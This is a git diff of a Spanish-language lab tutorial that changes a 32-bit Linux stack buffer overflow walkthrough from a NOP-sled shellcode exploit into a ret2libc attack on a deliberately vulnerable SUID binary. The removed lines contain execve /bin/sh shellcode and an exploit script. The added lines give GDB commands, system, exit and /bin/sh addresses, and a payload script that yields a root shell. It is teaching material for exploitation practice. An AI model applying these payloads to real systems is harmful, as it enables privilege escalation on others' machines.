@@ -1,22 +1,20 @@
 ---
-title:  "Buffer Overflow 32 Bits Linux"
+title:  "Buffer Overflow 32 Bits Linux (sin ASLR)"
 categories: 
   - Buffer Overflow
 tags:
   - Buffer Overflow
   - Linux
-  - OSCP
 toc: true
 toc_label: "Tabla de contenido"
 ---
 ## Entorno
-Antes de proceder con la explotación de un binario vulnerable a Buffer Overflow, deberemos establecer nuestro laboratorio.
+En este caso estaremos explotando un binario vulnerable a buffer overflow en una máquina linux de 32 bits, con el **DEP** `(Data Execution Prevention)` **activado** y el `ASLR` **desactivado**
 
 Necesitaremos:
 - Una máquina virtual Ubuntu 14.04.6 LTS de 32 bits.
 - GDB-Peda
 - Un binario vulnerable
-- Shellcode
 - Desactivar el ASLR
 
 ## Creación del binario
@@ -41,16 +39,16 @@ int main(int argc, char* argv[])
 ```
 ## Compilación
 
-Ahora vamos a compilar **buff.c**. Tras esto obtendremos nuestro binario **buff**.
+En este caso vamos a compilar nuestro binario de tal manera que el **DEP** `(Data Execution Prevention)` este **activado**, esto quiere decir que en este binaro **no** seremos capaces de poder inyectar nuestro shellcode dentro de la pila como lo es en el caso del [Stack Based Buffer Overflow](https://hacknotes.github.io/buffer%20overflow/buff32linux/).
 
 **Nota:** Si ejecutamos **file buff** nos dirá que es un binario ejecutable de 32 bits.
 {: .notice--danger}
 
 ```bash
-gcc -g -fno-stack-protector -z execstack -m32 buff.c -o buff
+gcc -fno-stack-protector -m32 buff.c -o buff
 ```
 
-![CompilaciónBuffLinux32](/assets/images/compilacionBuffLinux32bits.png)
+![CompilaciónBuffLinux32](/assets/images/compilacionBuffLinux32bitsSinAslr.png)
 
 ## Permisos
 
@@ -69,9 +67,7 @@ chmod +s buff
 
 ## Desactivar el ASLR
 
-Para este caso como explotaremos un buffer overflow stack based de 32 bits necesitaremos desactivar el ASLR, que es el que se encarga de la aleatoriedad de las direcciones de la memoria.
-
-Podemos ejecutar lo siguiente para poder saber si esta o no activado el ASLR.
+Podemos ejecutar lo siguiente para poder saber si esta o no activado el `ASLR`.
 
 ```bash
 ldd buff
@@ -79,7 +75,7 @@ ldd buff
 
 ![CompilaciónBuffLinux32](/assets/images/aslrActiveldd.png)
 
-Como podemos ver las direcciones van cambiando, esto significa que el ASLR esta **activado**, por lo tanto una vez más como el usuario **root** lo desactivaremos.
+Como podemos ver las direcciones van cambiando, esto significa que el `ASLR` esta **activado**, por lo tanto una vez más como el usuario **root** lo desactivaremos.
 
 Por defecto el valor de **randomize_va_space** es **"2"**.
 
@@ -131,9 +127,19 @@ r
 pattern search
 ```
 
-**5.** Ver los últimos 100 registros de la pila.
+**5.** Muestra la dirección de `system`.
 ```bash
-x/100wx $esp
+p system
+```
+
+**6.** Muestra la dirección de `exit`.
+```bash
+p exit
+```
+
+**7.** Muestra la dirección de `/bin/sh`.
+```bash
+find "/bin/sh" all
 ```
 
 ## Explotación
@@ -142,7 +148,7 @@ Lo que hace nuestro binario es recibir una cadena y luego imprimirla por pantall
 
 Pero ¿Que pasaría si la cadena que le pasamos supera el tamaño de **buffer** que definimos en nuestro binario?.
 
-Es ahí cuando abra un desbordamiento del buffer y esto nos permitirá tener el control sobre el binario, aprovechándonos de el EIP para apuntar a una dirección de la memoria en donde depositaremos nuestro shell code.
+Es ahí cuando abra un desbordamiento del buffer.
 
 ![Segmentation Fault](/assets/images/segmentationFault.png)
 
@@ -150,6 +156,7 @@ Para este paso puedes hacerlo manual como podemos observar en la imagen anterior
 
 ```python
 ./buff $(python -c 'print "A"*10')
+./buff $(python -c 'print "A"*100')
 ```
 
 ![Segmentation Fault](/assets/images/segmentationFaultPython.png)
@@ -157,6 +164,10 @@ Para este paso puedes hacerlo manual como podemos observar en la imagen anterior
 Lo bueno de **Peda** es que también admite ejecución en python y aparte con sus utilidades seremos capaces de encontrar más fácilmente el offset y controlar el **EIP**.
 
 ![Segmentation Fault](/assets/images/segmentationFaultPeda.png)
+
+**Nota:**
+Hay que tomar en cuenta que para este caso, repito, **NO** podremos ejecutar nuestro shellcode en la pila apuntándolo con el EIP, esta vez para poder aprovecharnos del desbordamiento del buffer haremos una llamada al sistema de modo que el EIP contenga valores predeterminados como el de `system`, `exit` y `/bin/sh`, a esto se lo llama `ret2libc attack`.
+{: .notice--danger}
 
 ### 1. Calculando el offset
 
@@ -192,65 +203,58 @@ r $(python -c 'print "A"*76 + "B"*4')
 
 ![Segmentation Fault](/assets/images/eipcontrol.png)
 
-A esto le deberemos sumar los nobs **\x90** ya que esto nos ayudara a apuntar a una dirección donde estos se encuentren hasta que finalmente la ejecución llegue a nuestro shellcode.
+### 3. Encontramos la dirección de system,exit y /bin/sh.
 
 ```python
-r $(python -c 'print "A"*76 + "B"*4 + "\x90"*100')
-```
-### 3. Elegimos una dirección en memoria.
-
-Con el siguiente comando seremos capaces de ver los últimos 100 registros de la memoria, podemos observar que muestra nuestros nobs **"\x90"** en las columnas de la derecha, y a la izquierda se muestra la dirección en la memoria donde estos se encuentran.
-
-Para continuar con nuestra explotación deberemos elegir cualquier dirección de memoria que contenga nuestros **"\x90"**.
-
-
-```python
-x/100wx $esp
+p system
+p exit
+find "/bin/sh" all
 ```
 
-![Segmentation Fault](/assets/images/memory.png)
+![Segmentation Fault](/assets/images/direccionesDelSistema.png)
 
 ### 4. Payload Final
 
-Ya como paso final solo debemos unir todos los datos que hemos ido recolectando en los pasos anteriores.
+Ya como paso final solo debemos unir todos los datos que hemos ido recolectando en los pasos anteriores, tomando en cuenta que usaremos `ret2libc attack`.
 
 - **Offset** = 76 `(multiplicar por "A").`
-- **Dirección en memoria** = 0xbfffefa0 `(debe estar en formato Little-Endian="\xa0\xef\xff\xbf").`
-- **Nobs** = \x90 `(en mi caso los multiplicare por 100 tu puedes multiplicarlo por cualquier número, mientras mayor sea la cantidad, mejor).`
-- Shellcode = [Shell Code](https://www.exploit-db.com/exploits/43735) `(en mi caso elegí uno que me permite obtener una shell al ejecutarlo).`
+- **Dirección de system** = 0xb7e53310 `(debe estar en formato Little-Endian)`
+- **Dirección de exit** = 0xb7e46260 `(debe estar en formato Little-Endian)`
+- **Dirección de /bin/sh** = 0xb7f75d4c `(debe estar en formato Little-Endian)`
 
 ```python
-$(python -c 'print "A"*76 + "\xa0\xef\xff\xbf" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x4>
+payload = offset + system + exit + /bin/sh
+$(python -c 'print "A"*76 + "\x10\x33\xe5\xb7" + "\x60\x62\xe4\xb7" + "\x4c\x5d\xf7\xb7"')
 ```
 
 Si ejecutamos nuestro payload desde `gdb` podemos observar que en efecto nos devuelve nuestra shell, pero en este caso como el usuario con pocos privilegios.
 
-![Segmentation Fault](/assets/images/shell.png)
+![Shell desde peda](/assets/images/shellPedaSinAslr.png)
 
 Debemos ejecutar directamente el binario que creamos `(buff)` con nuestro payload para obtener nuestra shell como `root`.
 
-![Segmentation Fault](/assets/images/rootShell.png)
+![Shell sin ASLR](/assets/images/rootShellSinAslr.png)
 	
 ## Recomendación
 
 En la imagen anterior podemos observar que una vez ejecutamos el binario junto con nuestro payload, recibimos nuestra shell como root, pero también podemos ver en la parte inferior que pasándole un script en python, obtenemos el mismo resultado, de hecho este script lo que nos permite es evitarnos pasar manualmente nuestra dirección de memoria a formato **Little-Endian**, ya que esto puede ocasionar errores.
 
-Para evitar eso el script utiliza la libreria `pack` que permite pasar la dirección de memoria a formato **Little-Endian** de forma automática.
+Para evitar eso el script utiliza la librería `pack` que permite pasar la dirección de memoria a formato **Little-Endian** de forma automática.
 
 ```python
-#!/usr/bin/python
+#/usr/bin/python2
 
 from struct import pack
 
-if __name__=='__main__':
+offset = 76
 
-        offset = 76
-        junk = "A"*offset
-        EIP = pack("<I", 0xbfffefa0)
-        nops = "\x90"*100
-        shell= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+systemAdd = pack("<I", 0xb7e53310)
+exitAdd = pack("<I", 0xb7e46260)
+binshAdd = pack("<I", 0xb7f75d4c)
 
-payload = junk + EIP + nops + shell
+junk = "A"*76
+
+payload = junk + systemAdd + exitAdd + binshAdd
 
 print payload
 ```
